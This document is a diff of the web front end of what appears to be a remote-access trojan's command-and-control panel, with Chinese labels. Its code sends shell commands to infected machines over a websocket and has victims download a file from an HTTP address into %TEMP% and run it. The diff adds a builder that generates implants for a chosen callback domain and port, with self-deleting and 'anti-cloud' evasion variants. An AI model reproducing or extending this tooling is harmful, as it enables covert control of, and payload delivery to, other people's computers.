@@ -119,6 +119,17 @@
         });});
     </script>
     <script>
+        function generate(){
+            $("#generate").css("display","block");
+            $("#fade").css("display","block");
+        }
+        function generate_close(){
+            // document.getElementById('light').style.display='none';
+            // document.getElementById('fade').style.display='none';
+            $("#generate").css("display","none");
+            $("#fade").css("display","none");
+            ws.send("shell|"+nowhandle+"|"+base.encode("reset"));
+        }
         function download_close(){
             // document.getElementById('light').style.display='none';
             // document.getElementById('fade').style.display='none';
@@ -129,7 +140,11 @@
         function download(ip,id) {
              $("#download").css("display","block");
             $("#fade").css("display","block");
+            if (nowhandle != id){
+                $("#cmd_textarea").val("")
+            }
             nowhandle=id;
+
             nowip=ip;
         }
         function cmd_close(){
@@ -158,11 +173,23 @@
                 return;
             }
             if ($("#save_path").val()==""){
-                $("#error_save_path").html("将写入临时文件目录");
+                $("#error_save_path").html("将写入默认目录");
                 $("#save_path").val("%TEMP%")
             }
             ws.send("download|"+nowhandle+"|"+encodeURI($("#http_address").val())+"|"+$("#save_path").val()+"|"+$("#is_run").val());
             $("#d_res").html("发送成功");
+        }
+
+        function generate_btu_on(){
+            if($("#domain").val()==""){
+                $("#error_domain").html("域名不能为空");
+                return;
+            }
+            if ($("#port").val()==""){
+                $("#error_port").html("端口不能为空");
+                return;
+            }
+            window.open("/generate?domain="+$("#domain").val()+"&port="+$("#port").val()+"&version="+$("#version").val(), "_blank"); 
         }
     </script>
 
@@ -178,10 +205,10 @@
         <button id="btn_Down" type="button" class="btn btn-primary">Download</button>
         <button id="btn_OpenUrl" type="button" class="btn btn-primary">OpenUrl</button>
         <button id="btn_del" type="button" class="btn btn-danger">Delete</button>
-        <button id="btn_del" type="button" class="btn btn-info" data-toggle="modal" data-target="#myModal">Generate</button>
+        <button id="btn_del" type="button" class="btn btn-info" onclick="generate();">Generate</button>
     </div>
     <br>
-    <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+    <!-- <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
         <div class="modal-dialog">
             <div class="modal-content">
                 <div class="modal-header">
@@ -201,9 +228,9 @@
                     <button type="button" class="btn btn-default" data-dismiss="modal">关闭</button>
                     <button type="button" class="btn btn-primary">提交更改</button>
                 </div>
-            </div><!-- /.modal-content -->
-        </div><!-- /.modal -->
-    </div>
+            </div>
+        </div>
+    </div> -->
     <div >
         <table id="server_list" border="1" width="80%" style="margin-left: 10%;margin-right: 10%;text-align: center">
             <tr id="title">
@@ -276,8 +303,26 @@
 
 
 </div>
+
 <div id="generate" class="white_content">Generate
-    <a href = "javascript:void(0)" onclick = "cmd_close();">关闭</a>
+    <a href = "javascript:void(0)" onclick = "generate_close();">关闭</a>
+    <h3>域名：</h3><input type="text" id="domain" value=""><p id="error_domain" style="color:red"></p>
+    <br>
+    <h3>后端端口：</h3><input type="text" id="port" value=""><p id="error_port" style="color:red"></p>
+    <p>必须要是后端，而不是当前网址访问的Web端，详细信息看下面的日志</p>
+    <br>
+    <h3>版本</h3>
+    <select id="version">
+        <option value="onlyRun">仅运行</option>
+        <option value="default">安装</option>
+        <option value="auto_remove">安装后自动删除</option>
+        <option value="anticloud">防云(level1)</option>
+        <option value="auticloud2">高级防云</option>
+    </select>
+    <br>
+    <button id="generate_btu" aligh="right" onclick="generate_btu_on()">生成</button>
+    <br>
+    <p>只写了仅运行和安装，其他都还没写</p>
 </div>
 <div id="fade" class="black_overlay"></div> 
 <body>
